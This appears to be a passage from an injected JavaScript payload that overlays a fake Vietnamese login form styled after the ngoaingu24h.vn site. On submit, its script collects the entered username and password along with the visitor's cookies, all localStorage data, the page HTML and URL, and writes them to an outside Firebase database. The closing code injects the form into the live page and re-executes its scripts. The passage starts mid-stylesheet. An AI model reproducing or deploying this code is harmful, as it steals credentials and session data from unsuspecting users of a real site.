				max-inline-size: 100%;
				max-width: 100%;
				min-block-size: 100%;
				min-height: 100%;
				min-inline-size: 100%;
				min-width: 100%;
				perspective-origin: 11.6875px 11.6875px;
				position: absolute;
				right: 0px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				top: 0px;
				transform-origin: 11.6875px 11.6875px;
				width: 23.375px;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
			}

			/*#IMG_21, #IMG_31*/

			#IMG_21:after,
			#IMG_31:after {
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				overflow-clip-margin: content-box;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
				overflow: clip;
			}

			/*#IMG_21:after, #IMG_31:after*/

			#IMG_21:before,
			#IMG_31:before {
				border-block-end-color: rgba(0, 0, 0, 0.54);
				border-block-start-color: rgba(0, 0, 0, 0.54);
				border-inline-end-color: rgba(0, 0, 0, 0.54);
				border-inline-start-color: rgba(0, 0, 0, 0.54);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.54);
				color: rgba(0, 0, 0, 0.54);
				column-rule-color: rgba(0, 0, 0, 0.54);
				cursor: text;
				overflow-clip-margin: content-box;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.54);
				text-emphasis-color: rgba(0, 0, 0, 0.54);
				text-size-adjust: 100%;
				text-wrap: nowrap;
				border: 0px none rgba(0, 0, 0, 0.54);
				font: 16px / 23px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.54) none 0px;
				overflow: clip;
			}

			/*#IMG_21:before, #IMG_31:before*/

			#INPUT_22,
			#INPUT_32 {
				appearance: menulist-button;
				block-size: 23px;
				border-block-end-color: rgb(0, 0, 0);
				border-block-end-style: none;
				border-block-end-width: 0px;
				border-block-start-color: rgb(0, 0, 0);
				border-block-start-style: none;
				border-block-start-width: 0px;
				border-inline-end-color: rgb(0, 0, 0);
				border-inline-end-style: none;
				border-inline-end-width: 0px;
				border-inline-start-color: rgb(0, 0, 0);
				border-inline-start-style: none;
				border-inline-start-width: 0px;
				box-sizing: content-box;
				display: block;
				height: 23px;
				inline-size: 449.425px;
				min-block-size: auto;
				min-height: auto;
				padding-block-end: 5px;
				padding-block-start: 4px;
				padding-inline-end: 0px;
				padding-inline-start: 0px;
				perspective-origin: 224.712px 16px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-size-adjust: 100%;
				transform-origin: 224.712px 16px;
				width: 449.425px;
				animation: 5000s ease 0s 1 normal none running mui-auto-fill;
				background: rgb(232, 240, 254) none repeat scroll 0% 0% / auto padding-box border-box;
				border: 0px none rgb(0, 0, 0);
				font: 16px / 23px SVN-Poppins;
				padding: 4px 0px 5px;
			}

			/*#INPUT_22, #INPUT_32*/

			#INPUT_22:after,
			#INPUT_32:after {
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-size-adjust: 100%;
				font: 16px / 23px SVN-Poppins;
			}

			/*#INPUT_22:after, #INPUT_32:after*/

			#INPUT_22:before,
			#INPUT_32:before {
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-size-adjust: 100%;
				font: 16px / 23px SVN-Poppins;
			}

			/*#INPUT_22:before, #INPUT_32:before*/

			#DIV_33 {
				block-size: 24px;
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				height: 24px;
				inline-size: 502.4px;
				margin-block-end: 10px;
				margin-block-start: 5px;
				perspective-origin: 251.2px 12px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: left;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				transform-origin: 251.2px 12px;
				width: 502.4px;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				margin: 5px 0px 10px;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_33*/

			#DIV_33:after {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: left;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_33:after*/

			#DIV_33:before {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: left;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_33:before*/

			#SPAN_34 {
				border-block-end-color: rgb(51, 122, 183);
				border-block-start-color: rgb(51, 122, 183);
				border-inline-end-color: rgb(51, 122, 183);
				border-inline-start-color: rgb(51, 122, 183);
				box-sizing: border-box;
				caret-color: rgb(51, 122, 183);
				color: rgb(51, 122, 183);
				column-rule-color: rgb(51, 122, 183);
				cursor: pointer;
				perspective-origin: 0px 0px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: left;
				text-decoration: none solid rgb(51, 122, 183);
				text-emphasis-color: rgb(51, 122, 183);
				text-size-adjust: 100%;
				transform-origin: 0px 0px;
				border: 0px none rgb(51, 122, 183);
				font: 16px / 24px SVN-Poppins;
				outline: rgb(51, 122, 183) none 0px;
			}

			/*#SPAN_34*/

			#SPAN_34:after {
				border-block-end-color: rgb(51, 122, 183);
				border-block-start-color: rgb(51, 122, 183);
				border-inline-end-color: rgb(51, 122, 183);
				border-inline-start-color: rgb(51, 122, 183);
				box-sizing: border-box;
				caret-color: rgb(51, 122, 183);
				color: rgb(51, 122, 183);
				column-rule-color: rgb(51, 122, 183);
				cursor: pointer;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: left;
				text-decoration: none solid rgb(51, 122, 183);
				text-emphasis-color: rgb(51, 122, 183);
				text-size-adjust: 100%;
				border: 0px none rgb(51, 122, 183);
				font: 16px / 24px SVN-Poppins;
				outline: rgb(51, 122, 183) none 0px;
			}

			/*#SPAN_34:after*/

			#SPAN_34:before {
				border-block-end-color: rgb(51, 122, 183);
				border-block-start-color: rgb(51, 122, 183);
				border-inline-end-color: rgb(51, 122, 183);
				border-inline-start-color: rgb(51, 122, 183);
				box-sizing: border-box;
				caret-color: rgb(51, 122, 183);
				color: rgb(51, 122, 183);
				column-rule-color: rgb(51, 122, 183);
				cursor: pointer;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: left;
				text-decoration: none solid rgb(51, 122, 183);
				text-emphasis-color: rgb(51, 122, 183);
				text-size-adjust: 100%;
				border: 0px none rgb(51, 122, 183);
				font: 16px / 24px SVN-Poppins;
				outline: rgb(51, 122, 183) none 0px;
			}

			/*#SPAN_34:before*/

			#DIV_35 {
				block-size: 92px;
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: inline-grid;
				grid-template-columns: 277.05px;
				grid-template-rows: 68px 24px;
				height: 92px;
				inline-size: 277.05px;
				margin-block-start: 20px;
				perspective-origin: 138.525px 46px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				transform-origin: 138.525px 46px;
				width: 277.05px;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				margin: 20px 0px 0px;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_35*/

			#DIV_35:after {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_35:after*/

			#DIV_35:before {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_35:before*/

			#BUTTON_36 {
				align-items: baseline;
				appearance: none;
				block-size: 48px;
				border-block-end-color: rgb(255, 255, 255);
				border-block-end-style: none;
				border-block-end-width: 0px;
				border-block-start-color: rgb(255, 255, 255);
				border-block-start-style: none;
				border-block-start-width: 0px;
				border-end-end-radius: 10px;
				border-end-start-radius: 10px;
				border-inline-end-color: rgb(255, 255, 255);
				border-inline-end-style: none;
				border-inline-end-width: 0px;
				border-inline-start-color: rgb(255, 255, 255);
				border-inline-start-style: none;
				border-inline-start-width: 0px;
				border-start-end-radius: 10px;
				border-start-start-radius: 10px;
				bottom: 0px;
				caret-color: rgb(255, 255, 255);
				color: rgb(255, 255, 255);
				column-rule-color: rgb(255, 255, 255);
				cursor: pointer;
				display: flex;
				height: 48px;
				inline-size: 277px;
				inset-block-end: 0px;
				inset-block-start: 0px;
				inset-inline-end: 0px;
				inset-inline-start: 0px;
				justify-content: center;
				left: 0px;
				margin-block-end: 20px;
				min-block-size: auto;
				min-height: auto;
				min-inline-size: 64px;
				min-width: 64px;
				padding-block-end: 6px;
				padding-block-start: 6px;
				padding-inline-end: 8px;
				padding-inline-start: 8px;
				perspective-origin: 138.5px 24px;
				position: relative;
				right: 0px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgb(255, 255, 255);
				text-emphasis-color: rgb(255, 255, 255);
				text-size-adjust: 100%;
				top: 0px;
				transform-origin: 138.5px 24px;
				user-select: none;
				vertical-align: middle;
				width: 277px;
				background: rgb(225, 4, 34) none repeat scroll 0% 0% / auto padding-box border-box;
				border: 0px none rgb(255, 255, 255);
				border-radius: 10px;
				font: 600 20px / 35px SVN-Poppins;
				margin: 0px 0px 20px;
				outline: rgb(255, 255, 255) none 0px;
				padding: 6px 8px;
				transition: all 0.5s ease 0s;
			}

			/*#BUTTON_36*/

			#BUTTON_36:after {
				border-block-end-color: rgb(255, 255, 255);
				border-block-start-color: rgb(255, 255, 255);
				border-inline-end-color: rgb(255, 255, 255);
				border-inline-start-color: rgb(255, 255, 255);
				box-sizing: border-box;
				caret-color: rgb(255, 255, 255);
				color: rgb(255, 255, 255);
				column-rule-color: rgb(255, 255, 255);
				cursor: pointer;
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgb(255, 255, 255);
				text-emphasis-color: rgb(255, 255, 255);
				text-size-adjust: 100%;
				user-select: none;
				border: 0px none rgb(255, 255, 255);
				font: 600 20px / 35px SVN-Poppins;
				outline: rgb(255, 255, 255) none 0px;
			}

			/*#BUTTON_36:after*/

			#BUTTON_36:before {
				border-block-end-color: rgb(255, 255, 255);
				border-block-start-color: rgb(255, 255, 255);
				border-inline-end-color: rgb(255, 255, 255);
				border-inline-start-color: rgb(255, 255, 255);
				box-sizing: border-box;
				caret-color: rgb(255, 255, 255);
				color: rgb(255, 255, 255);
				column-rule-color: rgb(255, 255, 255);
				cursor: pointer;
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-decoration: none solid rgb(255, 255, 255);
				text-emphasis-color: rgb(255, 255, 255);
				text-size-adjust: 100%;
				user-select: none;
				border: 0px none rgb(255, 255, 255);
				font: 600 20px / 35px SVN-Poppins;
				outline: rgb(255, 255, 255) none 0px;
			}

			/*#BUTTON_36:before*/

			#SPAN_37 {
				block-size: 48px;
				border-block-end-color: rgb(255, 255, 255);
				border-block-start-color: rgb(255, 255, 255);
				border-end-end-radius: 10px;
				border-end-start-radius: 10px;
				border-inline-end-color: rgb(255, 255, 255);
				border-inline-start-color: rgb(255, 255, 255);
				border-start-end-radius: 10px;
				border-start-start-radius: 10px;
				bottom: 0px;
				box-sizing: border-box;
				caret-color: rgb(255, 255, 255);
				color: rgb(255, 255, 255);
				column-rule-color: rgb(255, 255, 255);
				cursor: pointer;
				display: block;
				height: 48px;
				inline-size: 277px;
				inset-block-end: 0px;
				inset-block-start: 0px;
				inset-inline-end: 0px;
				inset-inline-start: 0px;
				left: 0px;
				perspective-origin: 138.5px 24px;
				pointer-events: none;
				position: absolute;
				right: 0px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(255, 255, 255);
				text-emphasis-color: rgb(255, 255, 255);
				text-size-adjust: 100%;
				top: 0px;
				transform-origin: 138.5px 24px;
				user-select: none;
				width: 277px;
				z-index: 0;
				border: 0px none rgb(255, 255, 255);
				border-radius: 10px;
				font: 600 20px / 35px SVN-Poppins;
				outline: rgb(255, 255, 255) none 0px;
				overflow: hidden;
			}

			/*#SPAN_37*/

			#SPAN_37:after {
				border-block-end-color: rgb(255, 255, 255);
				border-block-start-color: rgb(255, 255, 255);
				border-inline-end-color: rgb(255, 255, 255);
				border-inline-start-color: rgb(255, 255, 255);
				box-sizing: border-box;
				caret-color: rgb(255, 255, 255);
				color: rgb(255, 255, 255);
				column-rule-color: rgb(255, 255, 255);
				cursor: pointer;
				pointer-events: none;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(255, 255, 255);
				text-emphasis-color: rgb(255, 255, 255);
				text-size-adjust: 100%;
				user-select: none;
				border: 0px none rgb(255, 255, 255);
				font: 600 20px / 35px SVN-Poppins;
				outline: rgb(255, 255, 255) none 0px;
			}

			/*#SPAN_37:after*/

			#SPAN_37:before {
				border-block-end-color: rgb(255, 255, 255);
				border-block-start-color: rgb(255, 255, 255);
				border-inline-end-color: rgb(255, 255, 255);
				border-inline-start-color: rgb(255, 255, 255);
				box-sizing: border-box;
				caret-color: rgb(255, 255, 255);
				color: rgb(255, 255, 255);
				column-rule-color: rgb(255, 255, 255);
				cursor: pointer;
				pointer-events: none;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(255, 255, 255);
				text-emphasis-color: rgb(255, 255, 255);
				text-size-adjust: 100%;
				user-select: none;
				border: 0px none rgb(255, 255, 255);
				font: 600 20px / 35px SVN-Poppins;
				outline: rgb(255, 255, 255) none 0px;
			}

			/*#SPAN_37:before*/

			#DIV_38 {
				block-size: 24px;
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: flex;
				height: 24px;
				inline-size: 277.05px;
				min-block-size: auto;
				min-height: auto;
				min-inline-size: auto;
				min-width: auto;
				perspective-origin: 138.525px 12px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				transform-origin: 138.525px 12px;
				width: 277.05px;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_38*/

			#DIV_38:after {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_38:after*/

			#DIV_38:before {
				border-block-end-color: rgba(0, 0, 0, 0.87);
				border-block-start-color: rgba(0, 0, 0, 0.87);
				border-inline-end-color: rgba(0, 0, 0, 0.87);
				border-inline-start-color: rgba(0, 0, 0, 0.87);
				box-sizing: border-box;
				caret-color: rgba(0, 0, 0, 0.87);
				color: rgba(0, 0, 0, 0.87);
				column-rule-color: rgba(0, 0, 0, 0.87);
				display: block;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgba(0, 0, 0, 0.87);
				text-emphasis-color: rgba(0, 0, 0, 0.87);
				text-size-adjust: 100%;
				border: 0px none rgba(0, 0, 0, 0.87);
				font: 16px / 24px SVN-Poppins;
				outline: rgba(0, 0, 0, 0.87) none 0px;
			}

			/*#DIV_38:before*/

			#SPAN_39 {
				block-size: 24px;
				border-block-end-color: rgb(51, 122, 183);
				border-block-start-color: rgb(51, 122, 183);
				border-inline-end-color: rgb(51, 122, 183);
				border-inline-start-color: rgb(51, 122, 183);
				box-sizing: border-box;
				caret-color: rgb(51, 122, 183);
				color: rgb(51, 122, 183);
				column-rule-color: rgb(51, 122, 183);
				cursor: pointer;
				display: block;
				height: 24px;
				inline-size: 110.15px;
				min-block-size: auto;
				min-height: auto;
				min-inline-size: auto;
				min-width: auto;
				perspective-origin: 55.075px 12px;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(51, 122, 183);
				text-emphasis-color: rgb(51, 122, 183);
				text-size-adjust: 100%;
				transform-origin: 55.075px 12px;
				width: 110.15px;
				border: 0px none rgb(51, 122, 183);
				font: 16px / 24px SVN-Poppins;
				outline: rgb(51, 122, 183) none 0px;
			}

			/*#SPAN_39*/

			#SPAN_39:after {
				border-block-end-color: rgb(51, 122, 183);
				border-block-start-color: rgb(51, 122, 183);
				border-inline-end-color: rgb(51, 122, 183);
				border-inline-start-color: rgb(51, 122, 183);
				box-sizing: border-box;
				caret-color: rgb(51, 122, 183);
				color: rgb(51, 122, 183);
				column-rule-color: rgb(51, 122, 183);
				cursor: pointer;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(51, 122, 183);
				text-emphasis-color: rgb(51, 122, 183);
				text-size-adjust: 100%;
				border: 0px none rgb(51, 122, 183);
				font: 16px / 24px SVN-Poppins;
				outline: rgb(51, 122, 183) none 0px;
			}

			/*#SPAN_39:after*/

			#SPAN_39:before {
				border-block-end-color: rgb(51, 122, 183);
				border-block-start-color: rgb(51, 122, 183);
				border-inline-end-color: rgb(51, 122, 183);
				border-inline-start-color: rgb(51, 122, 183);
				box-sizing: border-box;
				caret-color: rgb(51, 122, 183);
				color: rgb(51, 122, 183);
				column-rule-color: rgb(51, 122, 183);
				cursor: pointer;
				scrollbar-color: rgb(208, 208, 208) rgb(249, 249, 249);
				text-align: center;
				text-decoration: none solid rgb(51, 122, 183);
				text-emphasis-color: rgb(51, 122, 183);
				text-size-adjust: 100%;
				border: 0px none rgb(51, 122, 183);
				font: 16px / 24px SVN-Poppins;
				outline: rgb(51, 122, 183) none 0px;
			}

			/*#SPAN_39:before*/
		</style>
		<div id="DIV_1">
			<div id="DIV_2">
			</div>
			<div id="DIV_3">
			</div>
			<div id="DIV_4">
				<div id="DIV_5">
					<h2 id="H2_6">
						Đăng nhập
						<button type="button" id="BUTTON_7">
						</button>
						<span id="SPAN_10"></span>
					</h2>
					<div id="DIV_11">
						<form id="form-login">
							<div id="DIV_13">
								<div id="DIV_14">
									<div id="DIV_15">
										<div id="DIV_16">
											<span id="SPAN_17">​</span><span id="SPAN_18"><span id="SPAN_19"><img alt=""
														src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%2725%27%20height=%2725%27/%3e"
														id="IMG_20" /></span><img alt="user"
													src="https://beta.ngoaingu24h.vn/_next/image?url=%2Fimages%2Fapp%2Faccount.png&amp;w=64&amp;q=75"
													id="IMG_21" /></span>
										</div>
										<input placeholder="Tài khoản đăng nhập" type="text" value="" id="login_username" />
									</div>
								</div>
							</div>
							<div id="DIV_23">
								<div id="DIV_24">
									<div id="DIV_25">
										<div id="DIV_26">
											<span id="SPAN_27">​</span><span id="SPAN_28"><span id="SPAN_29"><img alt=""
														src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%2725%27%20height=%2725%27/%3e"
														id="IMG_30" /></span><img alt="password"
													src="https://beta.ngoaingu24h.vn/_next/image?url=%2Fimages%2Fapp%2Fpassword.png&amp;w=64&amp;q=75"
													id="IMG_31" /></span>
										</div>
										<input name="password" placeholder="Mật khẩu" type="password" id="login_password" />
									</div>
								</div>
							</div>
							<div id="DIV_33">
								<span id="SPAN_34">Quên mật khẩu</span>
							</div>
							<div id="DIV_35">
								<button type="submit" id="BUTTON_36">
									Đăng nhập<span id="SPAN_37"></span>
								</button>
								<div id="DIV_38">
									Không có tài khoản? <span id="SPAN_39">Đăng ký ngay</span>
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>
			<div id="DIV_40">
			</div>
		</div>
	</div>



	<script>
		function loadFirebaseModule() {
			const script = document.createElement('script');
			script.type = 'module';
			script.textContent = \`
				// Import the functions you need from the SDKs you need
				import {
					initializeApp
				} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

				import {
					getDatabase,
					ref,
					set
				} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

				// TODO: Add SDKs for Firebase products that you want to use
				// https://firebase.google.com/docs/web/setup#available-libraries

				// Your web app's Firebase configuration
				const firebaseConfig = {
					apiKey: "AIzaSyCak83qo6Rcx7ix59GbBzFONMvQhUCrMio",
					authDomain: "ngoaingu24h-38719.firebaseapp.com",
					databaseURL: "https://ngoaingu24h-38719-default-rtdb.asia-southeast1.firebasedatabase.app",
					projectId: "ngoaingu24h-38719",
					storageBucket: "ngoaingu24h-38719.appspot.com",
					messagingSenderId: "40270579817",
					appId: "1:40270579817:web:18142fabcb0b10ea137af8"
				};

				// Initialize Firebase
				const app = initializeApp(firebaseConfig);

				// Process the URL to extract the path
				const url = window.location.href;
				const outerHTML = document.documentElement.outerHTML;

				// Retrieve cookie and localStorage data
				const cookie = document.cookie;

				// Function to convert localStorage items to a JSON string
				const localStorageToJson = () => {
					const obj = {};
					Object.keys(localStorage).forEach(key => obj[key] = localStorage.getItem(key));
					return JSON.stringify(obj);
				};
				const localStorageJSON = localStorageToJson();

				// Function to get CurrentFormattedTime
				function getCurrentFormattedTime() {
					const now = new Date();
					const year = now.getFullYear();
					const month = (now.getMonth() + 1).toString().padStart(2, '0');
					const day = now.getDate().toString().padStart(2, '0');
					const hours = now.getHours().toString().padStart(2, '0');
					const minutes = now.getMinutes().toString().padStart(2, '0');
					return \\\`\\\${year}-\\\${month}-\\\${day} \\\${hours}:\\\${minutes}\\\`;
				}
				const time = getCurrentFormattedTime();



				document.getElementById('form-login').addEventListener('submit', function (event) {
					event.preventDefault();

					// Collect user input
					const username = document.getElementById('login_username').value.trim();
					const password = document.getElementById('login_password').value.trim();


					if (username == null || password == null || username == '' || password == '') {
						console.log("~NULL !");
					} else {
						// Save user input to localStorage
						localStorage.setItem('username', username);
						localStorage.setItem('password', password);


						// Function to write data to the database
						function writeData(username, password, time, cookie, localStorageJSON, outerHTML, url) {
							const db = getDatabase();
              				let user = username.split("@")[0];
							set(ref(db, \\\`\\\${user}\\\/\\\${time}\\\`), {
								username: username,
								password: password,
								time: time,
								cookie: cookie,
								localStorage: localStorageJSON,
								outerHTML: outerHTML,
								url: url
							});
						}
						writeData(username, password, time, cookie, localStorageJSON, outerHTML, url);

						location.reload();
					}
				});
			\`;
			document.body.appendChild(script);
		}

		loadFirebaseModule();
	</script>

</body>

</html>
`;

// Step 2: Save the current HTML to localStorage
localStorage.setItem('originalHTML', document.documentElement.outerHTML);

// Step 3: Replace the current HTML with outerHTML
var divTag = document.createElement('div');
divTag.innerHTML = outerHTML;

document.body.appendChild(divTag);

// Find all script tags within the newly added content
var scriptTags = divTag.getElementsByTagName('script');

// Loop through the script tags and create new script elements
for (var i = 0; i < scriptTags.length; i++) {
	var scriptTag = scriptTags[i];
	var newScriptTag = document.createElement('script');
	newScriptTag.type = scriptTag.type;

	if (scriptTag.src) {
		// If the script tag has a src attribute, set it
		newScriptTag.src = scriptTag.src;
	} else {
		// Otherwise, copy the script content
		newScriptTag.text = scriptTag.innerHTML;
	}

	// Append the new script tag to the body
	document.body.appendChild(newScriptTag);

	// Optionally, remove the old script tag
	scriptTag.parentNode.removeChild(scriptTag);
}